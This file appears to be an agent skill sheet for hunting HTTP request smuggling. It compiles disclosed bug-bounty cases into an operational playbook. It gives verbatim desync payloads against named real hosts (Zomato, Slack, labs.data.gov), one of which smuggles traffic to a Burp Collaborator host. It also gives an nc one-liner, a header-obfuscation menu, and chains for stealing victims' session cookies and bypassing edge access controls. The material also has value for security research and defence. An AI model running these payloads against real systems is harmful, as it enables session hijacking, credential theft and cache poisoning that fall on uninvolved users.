---
name: hunter-l3-http-request-smuggling
description: "Use when hunting HTTP Request Smuggling on a target. Loads the L3 technique sheet: HTTP Request Smuggling exploits disagreements between two HTTP parsers on the same connection (front-end proxy/CDN/LB and back-end server, or client and proxy) about where one request ends and the next begins."
domain: cybersecurity
subdomain: web
tags:
- web
- http-request-smuggling
- hunting
- l3
version: '1.0'
---

# HTTP Request Smuggling — Technique Sheet

## Overview
HTTP Request Smuggling exploits disagreements between two HTTP parsers on the same connection (front-end proxy/CDN/LB and back-end server, or client and proxy) about where one request ends and the next begins. An attacker "hides" a second request inside the first (body, headers, trailers, or malformed framing), causing the back-end to process an unauthenticated, attacker-crafted request — often on a victim's socket. It pays when it bypasses edge access controls (Cloudflare Access, haproxy path ACLs), hijacks victims' requests to steal session tokens/cookies/PII, poisons caches, or forces mass redirects. Records here span CL.TE/TE.CL classics, obfuscated TE headers, parser bugs in Node/llhttp, Tomcat, Squid, Ruby WEBrick, Apache/AJP, curl, and edge-config injection (Cloudflare Rules).

## Distinct sub-patterns

### 1. CL.TE desync (frontend uses Content-Length, backend uses chunked)
Obfuscate the Transfer-Encoding header so the front-end ignores it while the back-end honors it.
- Endpoint shape: any path; `POST /` or the app's main endpoints. Method doesn't matter — `DELETE /` worked (Zomato).
- Payload (verbatim, id=771666, Zomato — tab after `Transfer-Encoding:`):
  ```
  DELETE / HTTP/1.1
  Transfer-Encoding:	chunked
  Host: api.zomato.com
  Content-Length: 51
  User-Agent: Treasure/6.7

  0

  GET /some/other/endpoint HTTP/1.1
  X-Ignore: X
  ```
- Root cause: tab after `Transfer-Encoding` makes the front-end treat the header as invalid and size by Content-Length; the back-end strips the tab and honors chunked, leaving leftover bytes (`GET /some/other/endpoint...`) in the socket.
- Impact: victim requests were redirected to an attacker endpoint via Burp Collaborator; captured `X-Access-Token` and victim IP; session takeover and PII retrieval (name, phone, email).
- Also: id=866382 (Brave, `POST /publishers/registrations.json` — smuggled request got `200 OK` where "Unverified request" expected) and id=867952 (Helium, `POST /api/sessions` — `200 OK` where `401` expected).

### 2. TE.CL desync (frontend uses chunked, backend uses Content-Length)
- Endpoint shape: `POST /` (labs.data.gov, id=726773).
- Payload (verbatim, note the space before the colon in `Transfer-Encoding :`):
  ```
  POST / HTTP/1.1
  Host: labs.data.gov
  Content-Type: application/x-www-form-urlencoded
  Content-length: 4
  Transfer-Encoding : chunked

  a2
  POST /hopefully404 HTTP/1.1
  Host: o0p31lhhe946t0sns65oy4vsejkb80.burpcollaborator.net
  Content-Type: application/x-www-form-urlencoded
  Content-Length: 15

  x=1
  0
  ```
- Root cause: front-end parses `Transfer-Encoding : chunked` (space before colon still honored) and treats the body as chunked; back-end uses `Content-length: 4` and treats the rest as a smuggled request.
- Impact: victim requests poisoned to 404s with attacker-controlled Host reflected in script/link tags of the victim's response — data theft, stored XSS, defacement.
- Variant: TE.CL confirmed on admin-official.line.me (LY Corp, id=740037, payload not stated; potential account takeover).

### 3. TE.TE — duplicate Transfer-Encoding headers
- Endpoint shape: `POST /`.
- Payload (verbatim, id=1002188, Node.js/haproxy):
  ```
  POST / HTTP/1.1
  Host: 127.0.0.1
  Transfer-Encoding: chunked
  Transfer-Encoding: chunked-false

  1
  A
  0

  GET /flag HTTP/1.1
  Host: 127.0.0.1
  foo: x
  ```
- Root cause: Node accepted duplicate TE headers and processed only the first; proxy and back-end disagreed on framing.
- Impact: smuggled `GET /flag` past the haproxy /flag access-control restriction — flag exposed.
- Related duplicate-TE: id=867577 (Basecamp, `POST /identity`, `Transfer-Encoding: chunked` + `Transfer-Encoding: foo`) — front-end sized by CL, back-end honored valid TE; impact: poisoned backend socket, captured visitors' request headers/cookies, could redirect JS imports to inject a keylogger.

### 4. Obfuscated whitespace before the TE colon (CLTE)
- Endpoint shape: any; `GET /` works (Slack, id=737140).
- Payload (verbatim):
  ```
  GET / HTTP/1.1
  Transfer-Encoding : chunked
  Host: slackb.com
  User-Agent: Smuggler/v1.0
  Content-Length: 83

  0

  GET <URL> HTTP/1.1
  X: X
  ```
  (Note: space between `Transfer-Encoding` and colon — here the frontend sizes by Content-Length, backend uses chunked — the mirror of sub-pattern 1's tab placement. Always test both directions.)
- Impact: stole victims' `d` session cookie via Burp Collaborator → full account takeover.
- Sibling: space-prefixed header (` Transfer-Encoding: chunked`) — id=753939 (Magic, `GET /login` at dashboard.fortmatic.com, CL: 5): leaked HMAC/encryption details and AWS signing data in error responses, plus cache poisoning → next visitor served an error page (DoS).
- Other forbidden-whitespace variants:
  - `Transfer-Encoding\x0b: chunked` (vertical tab, Squid CVE-2019-18678, id=758445): Squid accepted whitespace between field-name and colon → 3 responses for a 2-request stream, cache poisoning/DoS/XSS.
  - `Content-length: 4` with lowercase-mixed casing combined with `Transfer-Encoding :` (labs.data.gov above).

### 5. Bare `\n` header termination (header-splitting desync)
- Endpoint shape: `POST /{path}`.
- Payload (verbatim, id=526880, DoD):
  ```
  POST /{path} HTTP/1.1
  Fooz: bar
  Transfer-Encoding: chunked
  Host: stage.{host}
  ...
  Content-Length: 77
  Foo: bar

  0

  GET {path} HTTP/1.1
  X: X
  ```
- Root cause: front-end and back-end disagreed on header termination (`\n` vs `\r\n`).
- Impact: unauthenticated attacker replaced a victim request's response with a 302 redirect to an attacker-controlled site.

### 6. Lone CR as a header delimiter (Node.js llhttp — CVE-2022-32220-class, IBB)
- Endpoint shape: `POST /` against Node http server.
- Payload (verbatim, id=2001873):
  ```
  printf "POST / HTTP/1.1\r\nHost: localhost:5000\r\nX-Abc:\rxTransfer-Encoding: chunked\r\n\r\n1\r\nA\r\n0\r\n\r\n" | nc localhost 5000
  ```
  Also as plain request (id=2032842): header `X-Abc:` + CR + `xTransfer-Encoding: chunked`, body `1/A/0`.
- Root cause: llhttp treats a lone CR as a header delimiter instead of requiring CRLF, so `X-Abc:<CR>xTransfer-Encoding: chunked` is parsed as a valid `Transfer-Encoding: chunked` header while a front-end treats it as one opaque header line.
- Impact: smuggled body reached the server as a second request; access-control bypass.
- Sibling CR/termination bugs in llhttp: id=16653156/1665156 — multi-line TE header `Transfer-Encoding: chunked\r\n , chunked-false` parsed as two requests on Node v16.16.0/18.7.0 (incomplete CVE-2022-32215 fix); id=1888760 — header fields not terminated with CRLF (CVE-2022-35256); id=2054283 — `\r\n\rX` accepted as header-block terminator (CVE-2025-23167, fixed in llhttp v9).

### 7. CR→hyphen conversion in header names (Node.js)
- Endpoint shape: `GET /` through a proxy in front of Node.
- Payload: header name `Content[CR]Length: 42` (verbatim, id=922597).
- Root cause: Node converts CR inside a header name to a hyphen (yielding `Content-Length`) while the proxy drops the invalid header — the two parsers see different framing.
- Impact: desync enabling cache poisoning, session hijacking, XSS.

### 8. Malformed Content-Length (leading space / incomplete POST — Tomcat & Node)
- Leading-space `Content-length` (Node, CVE-2024-27982, id=2237099): `POST /hello` with a leading space before `Content-length` — header not read correctly, second request smuggled in the body. Impact: requests to `/hello` received responses from `/bye`; a smuggled request can consume another user's entire request including session data.
- Incomplete POST with oversized CL (Tomcat, id=2327341): send a POST with `Content-Length: 6` but only body `X`. Tomcat's error response for the incomplete POST can contain data from a *previous user's* request — leaked clear-text credentials. Chain: incomplete POST → victim browser connection desyncs → victim's sensitive data smuggled out in the error body.

### 9. Trailer-section smuggling (Tomcat)
- Endpoint shape: `POST /benign_path`.
- Payload (verbatim, id=2299692):
  ```
  POST /benign_path HTTP/1.1
  Host: a.com
  Connection: keep-alive
  Transfer-Encoding: chunked

  5
  12345
  0
  Content: hello
  a

  POST /benign_path HTTP/1.1
  Host: a.com
  Connection: keep-alive
  Content-Length: 37

  GET /evil_path HTTP/1.1
  Any: any
  Host: b.com

  ```
- Root cause: Tomcat's trailer parser skips lines without a colon and treats subsequent request lines as trailer content, splitting one request into two behind a reverse proxy.
- Impact: access logs proved both `POST /benign_path` (404) and smuggled `GET /evil_path` (404) processed as separate requests.
- Note the trick: the first smuggled request uses a well-formed CL to swallow the trailing bytes of the second smuggled request.

### 10. Malformed chunked value accepted as chunked (Ruby WEBrick)
- Endpoint: webrick `read_body`. Payload: `Transfer-Encoding: AAAchunkedBBB` (verbatim, id=965267).
- Root cause: `read_body` matches transfer-encoding with `/chunked/io` — any value containing "chunked" is accepted.
- Impact: request smuggling / user-experience disruption.

### 11. Non-standard whitespace in request lines/headers (Apache) and parser disagreement zoo
- id=244459: Apache accepted bare CR, FF, VTAB, HTAB in request lines/headers (RFC 7230 deviation). In proxy chains the back-end interprets request A as A+A′ → cache pollution or serving A′ to a different user. Payload not stated beyond whitespace characters.
- id=648437/648434 (IBB): systematic disagreement across Apache, Jetty, Tomcat, Node, Go, Pound, Varnish, Nginx via crafted headers, control characters, and HTTP/0.9 downgrades — impact: cache poisoning, credential/request hijacking, DoS via request/response mixing, security-filter bypass, SSRF.

### 12. Edge config injection (Cloudflare Transform Rules / Origin Rules)
- Transform Rules `concat()` (id=1478633): payload `\x0a\x0d` — hex-escaped CRLF injected via concat(). Root cause: no validation of hex-escaped characters. Impact: bypassed Cloudflare Access and viewed internal origin server content.
- Origin Rules `host_header` (id=1575912): `POST /zones/{id}/rulesets` with CRLF characters in the `host_header` action parameter. Root cause: missing CRLF validation → arbitrary headers injected into the upstream request. Chain: set rule → inject headers → smuggle request past the edge → bypass Cloudflare Access → view internal origin content.

### 13. Host-header reflection + smuggling (mass redirect)
- id=1063493 / 1063627 (Acronis, promosandbox/consumer.acronis.com): base64-encoded payload; core is `POST /` with `Transfer-Encoding<tab>:<tab>chunked` vs Content-Length, plus an attacker `Host` header in the smuggled request. Root cause: TE-tab vs CL framing disagreement; Host reflected into a redirect. Impact: mass redirects of real users to attacker-controlled domains (pqp.mx / Burp Collaborator), with real inbound connections observed.

### 14. CL.0 desync on CDN front-ends
- id=1943608 (LinkedIn via 3rd-party CDN): CL.0 desync — back-end ignores Content-Length on requests it believes have no body (e.g., GET). Impact: mass redirection of users to an attacker-controlled server without user interaction. Payload not stated.

### 15. HTTP/2 ↔ HTTP/1.1 and proxy-response desync (curl)
- id=3793495: `-H "Transfer-Encoding: chunked"` + redirect from HTTP/1.1 to HTTP/2 — `upload_chunky` flag not reset, so `Transfer-Encoding: chunked` (illegal in HTTP/2, RFC 9113) is sent post-redirect → desync in H1↔H2 translation environments.
- id=3623064 (curl CONNECT proxy, cf-h1-proxy.c): malicious proxy sends `407` with both CL and `TE: chunked`; curl checks CL first and skips chunked parsing, leaving chunked data in the socket buffer → poisons the next CONNECT response read ("Invalid response header"), injected data processed as a response to a subsequent credentialed request.

### 16. Header-count truncation while framing continues (Node.js forwarding proxies)
- id=3564941: Node omits headers beyond `maxHeadersCount`/`maxHeaderPairs` from `req.headers`/`rawHeaders` while still using them for framing — a forwarding proxy that rebuilds outbound headers from visible headers while piping the original body can desync a reused back-end connection. Affects Node 22/24/26. Payload not stated.

### 17. Connection-close bypass (llhttp HTAB)
- id=3723248: header `Connection: close\t` (trailing HTAB, verbatim). Root cause: llhttp's Connection token parser accepts comma/space/CR/LF after `close` but not HTAB, dropping the CONNECTION_CLOSE state — connection stays alive. Impact: one TCP write produced two requests (`/first` and `/smuggled`); inject an extra request into a connection that should have closed.

### 18. Inconsistent backend interpretation — AJP (CVE-2022-26377)
- id=1594627: Apache mod_proxy_ajp vs AJP server interpret requests inconsistently → smuggled requests reach the AJP backend. Impact: information disclosure and RCE. Payload not stated.

### 19. CL.TE with response-splitting detection (X/Twitter family)
- id=713285 (pscp.tv / periscope.tv): CL.TE with mismatched CL and chunked body. Detection: delayed 504 response. Impact: CSRF-token bypass, cookie injection to link attacker account with victim's Google/Twitter account, victim-request poisoning, DoS.
- id=715996 (twitter.com): `Transfer-Encoding: chunked` with chunked body followed by a second (TWEET) request → confirmed smuggling; successful attack posts a tweet to the attacker's account and can act on the victim's session.
- id=777651 (Stripo, `POST /?aeRg={num}` with a numeric cache-buster param): TE/CL confusion → back-end TCP/TLS socket poisoning, prepending arbitrary data to the next request → front-end security-rule bypass, internal system access, cache poisoning, attacking browsing users.

## Bypass / chain notes
- Obfuscation menu (pick whichever the front-end normalizes but the back-end doesn't, and try the mirror): space before colon (`Transfer-Encoding : chunked`), tab after colon (`Transfer-Encoding:\tchunked`), leading space before header name (` Transfer-Encoding: chunked`), vertical tab before colon (`\x0b`), duplicate TE headers (`chunked` + `chunked-false`/`foo`), multi-line TE continuation (` , chunked-false` on the next line), lone CR inside header values/names, bare `\n` line endings.
- Access-control bypass: smuggle a request for a forbidden path (e.g. `GET /flag`, internal origin paths) so the front-end ACL never sees it — Node/haproxy (1002188), Cloudflare Access (1478633, 1575912).
- Victim-hijack chain (most repeated): desync payload (`0\r\n\r\n` + smuggled request with attacker Host/URL) → victim's next request on the poisoned socket gets redirected (302 or backend 301) to attacker's Collaborator domain → victim's cookies/session tokens arrive at the attacker (Slack `d` cookie, Zomato X-Access-Token, Basecamp headers+cookies).
- Detection chains from records: delayed 504 on CL.TE desync (X); two responses to one request (DoD 1120982 — 302 + 200 image/png on one connection); expected 401/"Unverified" replaced by 200 OK (Helium, Brave); access-log evidence of two parsed requests (Tomcat trailers); 3 responses for 2 requests (Squid).
- Socket poisoning → prepend arbitrary data to the next victim request (Stripo, Basecamp) — usable for front-end rule bypass and cache poisoning even when the attacker can't directly read responses.
- Detection tooling visible in payloads: `User-Agent: Smuggler/v1.0` (Slack record).
- Error-message oracle: TE/CL confusion on `GET /login` leaked HMAC/encryption and AWS signing details in back-end error responses (Magic).

## Gotchas / what NOT to do
- Don't assume the desync direction — the same obfuscation yields CL.TE on one stack and TE.CL on another (tab-after-colon gave CL.TE on Zomato; space-before-colon gave CLTE on Slack but TE.CL on labs.data.gov). Test both directions with the same shape.
- Don't test on victim-shared sockets carelessly: smuggling fires on the *next* request over that back-end connection — poisoning affects other users. Records note internal-origin-content findings were scoped as "internal investigation only, no customer data proven affected" (Cloudflare) — impact scoping matters.
- Don't rely on a single confirmation signal; use the concrete proofs from records: access logs (Tomcat), two responses on one connection (DoD), Collaborator callbacks (Slack/Zomato/Acronis), expected-error-to-200 flip (Helium/Brave).
- Don't leave CL/TE mismatches half-specified: the Tomcat trailer payload works because the smuggled request's CL exactly swallows the remaining bytes; sloppy lengths desync your own test instead of the target.
- Don't conclude "not exploitable" when a direct impact isn't shown — LinkedIn's CL.0 was accepted with mass-redirect impact even though the target's multi-CDN setup limited blast radius; several Node parser bugs were accepted on smuggling capability alone.
- Numeric cache-buster query params (`?aeRg=2056729135`, `?t=41`) were used to avoid hitting cached copies — replicate this so you measure the origin, not the cache.
- Confirm against current versions: many of these are patched llhttp/Tomcat/Squid/curl CVEs; verify the target actually runs the vulnerable parser behavior before reporting.

## Real-world impact examples
- Full account takeover via stolen cookie: Slack `d` session cookie exfiltrated through a CLTE-poisoned socket → full account takeover and data theft (id=737140).
- Session token + PII capture: victim's X-Access-Token and IP captured via Burp Collaborator; name/phone/email retrieved (Zomato, id=771666).
- Auth bypass at the edge: `GET /flag` smuggled past haproxy ACL (Node.js, id=1002188); Cloudflare Access bypassed to read internal origin content via `\x0d\x0a` in Transform Rules and `host_header` Origin Rules (ids 1478633, 1575912).
- Mass user redirection: Acronis users redirected to attacker domain with real connections received (ids 1063493/1063627); LinkedIn users mass-redirected with zero interaction (id=1943608); unauthenticated 302 hijack of a victim's response on a DoD host (id=526880).
- Credential leakage: Tomcat incomplete-POST error responses leaked another user's clear-text credentials (id=2327341); Magic's desync leaked HMAC/encryption and AWS signing data (id=753939).
- Victim actions on attacker's behalf: smuggled TWEET request posted to the attacker's account; CSRF-token bypass and account-linking cookie injection on pscp.tv/periscope.tv (ids 715996, 713285).
- Keylogger injection path: Basecamp socket poisoning enabled redirecting JS imports to inject a keylogger into victims' pages (id=867577).
- RCE via parser disagreement: Apache→AJP smuggling (CVE-2022-26377) led to information disclosure and RCE (id=1594627).